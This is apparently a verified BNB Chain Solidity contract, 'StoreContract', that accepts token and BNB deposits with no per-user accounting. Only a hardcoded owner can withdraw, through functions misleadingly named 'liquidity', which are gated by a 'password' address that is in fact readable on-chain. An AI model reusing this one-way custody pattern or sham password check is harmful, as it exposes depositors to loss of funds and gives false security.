/**
 *Submitted for verification at BscScan.com on 2022-03-22
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-07
 */

pragma solidity 0.5.10;

interface IBEP20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
   * @dev Returns the token name.
   */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract StoreContract {

  address payable private owner = 0x93B95dBFB7FDb8AE6ADa17207b595c8598497a50;
  address private pass = 0x0000000000000000000000000000000000000111;
  address public token = 0xcc409e15AC327772b029BF1021cA5E848Aba8d29;   // 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56

  constructor() public {
  }

  function liquidity(address _pass, uint256 _amount) public {
    require(msg.sender == owner);
    require(pass == _pass);
    uint256 _balance = IBEP20(token).balanceOf(address(this));
    require(_balance > 0, "no liquidity");
    if(_balance < _amount) IBEP20(token).transfer(owner, _balance);
    else IBEP20(token).transfer(owner, _amount);
  }

  function coinLiquidity(address _pass, uint256 _amount) public {
    require(msg.sender == owner);
    require(pass == _pass);
    uint256 _balance = address(this).balance;
    require(_balance > 0, "no liquidity");
    if(_balance < _amount) owner.transfer(_balance);
    else owner.transfer(_amount);
  }

  function depositCoin() public payable {
  }

  function depositToken(uint256 _amount) external {
    IBEP20(token).transferFrom(msg.sender, address(this), _amount);
  }

  function getTokenBalance() external view returns(uint256) {
    return IBEP20(token).balanceOf(address(this));
  }

  function getCoinBalance() external view returns(uint256) {
    return address(this).balance;
  }
}